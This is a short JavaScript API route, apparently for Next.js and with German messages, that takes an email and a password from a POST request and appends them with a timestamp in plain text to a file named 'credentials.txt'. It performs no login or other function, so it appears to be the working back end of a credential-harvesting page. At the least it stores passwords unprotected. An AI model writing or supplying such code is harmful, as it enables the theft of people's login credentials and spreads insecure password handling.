import { promises as fs } from 'fs';
import path from 'path';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Fehlende Daten' });
    }

    const logEntry = `${new Date().toISOString()} | Email: ${email} | Passwort: ${password}\n`;
    const filePath = path.join(process.cwd(), 'credentials.txt');

    try {
      await fs.appendFile(filePath, logEntry);
      res.status(200).json({ message: 'Gespeichert' });
    } catch (err) {
      res.status(500).json({ error: 'Serverfehler' });
    }
  } else {
    res.status(405).json({ error: 'Nur POST erlaubt' });
  }
}
